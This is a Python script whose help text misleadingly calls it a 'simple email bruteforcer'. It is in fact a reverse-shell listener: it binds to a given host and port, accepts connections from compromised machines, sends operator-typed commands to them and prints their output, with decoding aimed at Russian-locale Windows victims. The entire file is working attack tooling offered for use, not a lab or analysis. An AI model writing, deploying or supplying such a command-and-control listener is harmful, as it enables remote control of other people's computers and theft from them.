#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Python 3.4
# made by  Xtr3am3r.0k@gmail.com
import argparse, sys
import signal
from socket import *

parser = argparse.ArgumentParser(description='Simple email bruteforcer')
parser.add_argument('-a','--host', help='set lhost', required=True)
parser.add_argument('-p','--port', help='set lport', required=True)
args = vars(parser.parse_args())

host = args['host']
port = int(args['port'])
print('\n\n\n')
print('[+] SERVER IP:', host)
print('[+] SERVER HOST:', port)


def server():
    print('[+] Server start listening port.........\n')
    while True:
        sockobj = socket(AF_INET, SOCK_STREAM)
        sockobj.bind((host, port))
        sockobj.listen(5)
        while True:
            connection, adress = sockobj.accept()
            try:
                print('[#] Have new connection ==>>', adress)
                while True:
                    try:
                        cmd = str(input('#input cmd: '))
                        if cmd == 'quit':
                            print('connection from adress {} close......'.format(adress))
                            connection.close()
                            sockobj.close()
                        if len(str.encode(cmd)) > 0:
                            connection.send(cmd.encode())
                            client_data = (connection.recv(1024))
                            try:
                                print(client_data.decode('utf-8', errors='ignore')+'\n')# English
                            except:
                                print(client_data.decode('cp866', errors='ignore')+'\n')# Russian
                    except:
                        break

            except KeyboardInterrupt:
                print("W: interrupt received, stopping…")
                connection.close()
                sockobj.close()
            except Exception:
                connection.close()
                print('[-] Connection Reset Error: [WinError 10054] for {}'.format(adress),
                      '\n\n\n[*]wait for new Connections')


if __name__ == "__main__":
    server()
